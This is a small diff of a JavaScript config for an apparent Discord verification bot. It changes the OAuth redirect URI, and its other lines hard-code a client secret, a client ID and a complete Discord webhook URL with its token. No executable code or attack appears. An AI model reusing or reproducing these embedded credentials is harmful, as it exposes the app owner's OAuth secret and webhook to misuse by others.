@@ -1,7 +1,7 @@
 //Change these btw
 const client_secret = 'e92eb957-6e2f-43ad-a233-dfbec6cadc86'
 const client_id = 'a1ad2d37-7be9-4db9-bad1-e457f14e2e1b'
-const redirect_uri = 'https://discord-verification-bot-79dd.onrender.com/'
+const redirect_uri = 'https://discord-verification-bot-7o8d.onrender.com'
 const webhook_url = 'https://discord.com/api/webhooks/1065835230621081684/CwV2UA-Fg7iT42kf4SqeL_3DBCNL9xyb9zw5ZSpeP7k-W_VHkOgY35j0fbilaswbk_PW'
 
 //Requirements
